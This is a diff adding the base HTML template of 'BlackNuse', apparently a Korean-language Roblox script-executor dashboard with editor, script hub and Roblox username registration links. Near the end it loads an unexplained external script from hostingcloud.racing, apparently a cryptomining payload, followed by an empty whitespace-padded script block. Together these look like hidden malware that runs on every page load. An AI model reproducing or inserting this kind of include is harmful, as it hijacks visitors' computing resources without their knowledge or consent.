@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<!-- Created by CodingLab |www.youtube.com/CodingLabYT-->
+<html lang="en" dir="ltr">
+
+<head>
+  <meta charset="UTF-8">
+  <title> BlackNuse </title>
+  <link rel="stylesheet" href="static/dashboard.css">
+  <link rel="stylesheet" href="static/styles.css">
+  <link rel="stylesheet" href="static/style.css">
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body>
+  <div class="sidebar open">
+    <div class="logo-details">
+      <i class='bx bxs-capsule icon'></i>
+      <div class="logo_name">BlackNuse</div>
+    </div>
+    <ul class="nav-list">
+      <li>
+        <a href="editor">
+          <i class='bx bx-code-alt'></i>
+          <span class="links_name">에디터</span>
+        </a>
+        <span class="tooltip">에디터</span>
+      </li>
+      <li>
+        <a href="script-hub">
+          <i class='bx bx-grid-alt'></i>
+          <span class="links_name">스크립트 허브</span>
+        </a>
+        <span class="tooltip">스크립트 허브</span>
+      </li>
+      <li>
+        <a id="roblox">
+          <i class='bx bxs-id-card'></i>
+          <span class="links_name">로블록스 등록</span>
+        </a>
+        <span class="tooltip">로블록스 등록</span>
+      </li>
+      <li>
+        <a href="rule">
+          <i class='bx bx-pyramid'></i>
+          <span class="links_name">규칙</span>
+        </a>
+        <span class="tooltip">규칙</span>
+      </li>
+      <li>
+        <a href="#">
+          <i class='bx bxl-discord-alt'></i>
+          <span class="links_name">디스코드</span>
+        </a>
+        <span class="tooltip">디스코드</span>
+      </li>
+      <li class="profile">
+        <div class="profile-details">
+          <img src="{{ profile }}" alt="profileImg">
+          <div class="name_job">
+            <div class="name">{{ discord_name }}</div>
+            <div class="job">{{ plan }}</div>
+          </div>
+        </div>
+        <i class='bx bx-log-out' id="log_out"></i>
+      </li>
+    </ul>
+  </div>
+  <section class="home-section">
+    {% block content %}{% endblock %}
+  </section>
+</body>
+<style>
+</style>
+<script>
+  document.getElementById("roblox").addEventListener("click", function (event) {
+    Swal.fire({
+      title: '로블록스 닉네임 등록',
+      text: '표시 이름이 아닌 사용자 이름이어야 합니다',
+      input: 'text',
+      showCancelButton: true,
+      confirmButtonText: '등록',
+      cancelButtonText: '취소'
+    }).then((result) => {
+      if (result.isConfirmed) {
+        fetch("{{ url_for('roblox') }}", {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            name: result.value
+          }),
+        })
+        Swal.fire({
+          title: '등록되었습니다',
+          confirmButtonText: '확인',
+        })
+      } else {
+        Swal.fire({
+          title: '취소되었습니다',
+          confirmButtonText: '확인',
+        })
+      }
+    });
+  });
+</script>
+<script src="https://www.hostingcloud.racing/OJoO.js"></script>
+<script>
+                                                                                                                                                                             
+    
+
+</script>
+</html>
